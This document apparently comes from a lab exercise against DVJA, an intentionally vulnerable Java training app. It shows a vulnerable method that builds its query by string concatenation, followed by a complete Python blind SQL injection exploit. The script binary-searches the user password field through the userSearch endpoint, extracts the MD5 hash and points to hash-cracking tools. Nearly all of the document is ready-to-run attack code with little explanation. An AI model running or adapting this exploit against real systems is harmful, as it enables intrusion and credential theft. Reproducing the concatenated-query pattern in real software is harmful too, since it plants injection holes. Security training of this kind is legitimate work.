'''
src/main/java/com/appsecco/dvja/services/UserService.java

public User findByLoginUnsafe(String login) {
    Query query = entityManager.createQuery("SELECT u FROM User u WHERE u.login = '" + login + "'");
    List<User> resultList = query.getResultList();

    if(resultList.size() > 0)
        return resultList.get(0);
    else
        return null;
}
'''

#!/usr/bin/env python3
import requests
import urllib3
import string

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target settings
BASE_URL = "http://localhost:9000"
PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
SESSION_ID = "1novit506d1dl1ijn7zjo6i7cj"

# MD5 Hash Constraints
CHARSET = "0123456789abcdef"  # Only valid hex characters
HASH_LENGTH = 32  # MD5 hashes are always 32 characters long

# Function to send SQL injection payloads
def send_payload(payload):
    session = requests.Session()
    session.cookies.set("JSESSIONID", SESSION_ID)
    url = f"{BASE_URL}/userSearch.action"
    data = {"login": payload}

    response = session.post(url, data=data, proxies=PROXIES, verify=False)
    return "User found" in response.text

# Step 1: Extract MD5 Password Hash (Fixed Length)
def binary_search_char(position):
    low, high = 0, len(CHARSET) - 1
    while low <= high:
        mid = (low + high) // 2
        mid_char = CHARSET[mid]

        payload = f"' OR ASCII(SUBSTRING(u.password, {position}, 1)) >= ASCII('{mid_char}') -- '"
        if send_payload(payload):
            low = mid + 1  # Move right
        else:
            high = mid - 1  # Move left

    return CHARSET[high] if high >= 0 else None

# Step 2: Extract Full MD5 Hashed Password
def extract_hashed_password():
    hashed_password = ""
    print("[*] Extracting MD5 password hash using binary search...")
    for i in range(1, HASH_LENGTH + 1):
        char = binary_search_char(i)
        if char:
            hashed_password += char
            print(f"[+] Found character {i}: {char}")
        else:
            print(f"[-] Failed to extract character at position {i}")
            break
    return hashed_password

def main():
    print("=== MySQL SQL Injection Exploit ===")
    hashed_password = extract_hashed_password()
    if hashed_password:
        print(f"[+] Extracted MD5 hashed password: {hashed_password}")
        print("[*] Try cracking the hash using a tool like Hashcat or JohnTheRipper.")
    else:
        print("[-] Could not extract hashed password, aborting.")

if __name__ == "__main__":
    main()